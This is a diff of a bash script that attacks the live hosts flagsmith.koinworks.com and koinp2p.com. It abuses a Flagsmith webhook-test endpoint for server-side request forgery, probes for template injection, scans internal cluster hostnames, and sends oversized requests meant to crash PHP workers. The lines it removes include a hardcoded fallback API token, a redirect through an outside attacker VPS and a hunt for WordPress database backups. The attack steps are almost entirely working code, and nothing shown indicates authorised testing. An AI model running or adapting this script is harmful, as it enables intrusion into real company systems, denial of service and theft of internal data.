@@ -4,69 +4,83 @@ UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Ge
 # Register fresh account
 ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
   -H "Content-Type: application/json" -H "User-Agent: $UA" \
-  -d '{"email":"kw-v13@proton.me","password":"Xk9mPw3nRt!13","first_name":"V","last_name":"13"}' --max-time 15)
+  -d '{"email":"kw-v14@proton.me","password":"Xk9mPw3nRt!14","first_name":"V","last_name":"14"}' --max-time 15)
 KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
 echo "Key: $KEY"
-[ -z "$KEY" ] && KEY="87e2431cf1869ab16f10eb96774f0c905f947935" && EKEY="95nCRUg5XVfxsREBb5YUiw" && echo "Fallback"
 
-if [ -z "$EKEY" ]; then
-  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d '{"name":"v13"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
-  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"name\":\"v\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
-  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"name\":\"v\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
-fi
-echo "Env: $EKEY"
+[ -z "$KEY" ] && echo "REG FAILED" && exit 1
+
+# Create org + project + env
+OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d '{"name":"v14"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
+echo "Org:$OID Proj:$PID Env:$EKEY"
 
 SSRF() {
   curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
-    -H "User-Agent: $UA" \
-    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
+    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TIMEOUT"
 }
 
-# SSRF via 303 redirect → GET (bypasses POST-only restrictions)
-SSRF_GET() {
-  # Use VPS 303 redirect to convert POST → GET
-  # First update VPS redirect target (not possible from GH actions)
-  # So use direct URL parameter approach
-  SSRF "http://64.227.62.83:8891/$1"
-}
+# === TEST 1: SSTI via feature flag ===
+echo "=== SSTI TEST ==="
+# Create feature with template payload in initial_value
+feat=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/${PID}/features/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d '{"name":"ssti_test","type":"FLAG","default_enabled":true,"initial_value":"{{7*7}}"}' --max-time 10)
+echo "Feature: $feat" | head -c 200
+echo ""
 
-# Enumerate files via direct POST (status codes tell us what exists)
-echo "=== FILE ENUMERATION ==="
+# Check if value got rendered
+flags=$(curl -s "https://flagsmith.koinworks.com/api/v1/flags/" \
+  -H "X-Environment-Key: $EKEY" -H "User-Agent: $UA" --max-time 10)
+echo "Flags: $flags" | head -c 300
+echo ""
+
+# === TEST 2: SSRF to internal koinworks services ===
+echo "=== INTERNAL SERVICES SCAN ==="
+# GCP internal DNS names
+for host in \
+  "koinp2p.internal" \
+  "wordpress.koinworks.internal" \
+  "wp.koinworks.internal" \
+  "koinp2p.koinworks.svc.cluster.local" \
+  "flagsmith-api.default.svc.cluster.local" \
+  "redis-master.default.svc.cluster.local"; do
+  echo -n "$host -> "
+  SSRF "http://${host}/"
+  echo ""
+done
+
+# === TEST 3: PHP2Shell via koinp2p admin-ajax (multipart in URL query?) ===
+# This won't work for PHP2Shell but let me test something creative:
+# What if we can trigger PHP fatal error via admin-ajax to corrupt worker state?
+echo "=== PHP WORKER CRASH TEST ==="
+# Send very long query string to trigger memory issues
+LONG=$(python3 -c "print('A'*50000)")
+echo -n "Long query -> "
+SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat&data=${LONG}"
+echo ""
+
+# === TEST 4: Check if koinp2p.com has any writable upload endpoint ===
+echo "=== UPLOAD ENDPOINT SCAN ==="
 for path in \
-  "wp-content/uploads/" \
-  "wp-content/backup-db/" \
-  "wp-content/backups/" \
-  "wp-content/cache/" \
-  "wp-content/updraft/" \
-  "wp-content/ai1wm-backups/" \
-  "wp-content/mysql.sql" \
-  "wp-content/database.sql" \
-  "wp-content/dump.sql" \
-  "wp-content/db-backup/" \
-  "readme.html" \
-  "license.txt" \
-  "wp-includes/version.php" \
-  "wp-admin/install.php" \
-  "wp-admin/setup-config.php"; do
+  "wp-admin/async-upload.php" \
+  "wp-admin/media-new.php" \
+  "wp-admin/admin-post.php" \
+  "wp-admin/admin-ajax.php?action=upload-attachment"; do
   echo -n "$path -> "
   SSRF "https://koinp2p.com/${path}"
   echo ""
 done
 
-# Check if UpdraftPlus backup files are accessible
-echo "=== UPDRAFT BACKUPS ==="
-for f in \
-  "wp-content/updraft/" \
-  "wp-content/updraft/index.html" \
-  "wp-content/plugins/updraftplus/readme.txt"; do
-  echo -n "$f -> "
-  SSRF "https://koinp2p.com/${f}"
-  echo ""
-done
+# === TEST 5: WordPress password reset (triggers email with internal info) ===
+echo "=== WP PASSWORD RESET ==="
+SSRF "https://koinp2p.com/wp-login.php?action=lostpassword"
+echo ""
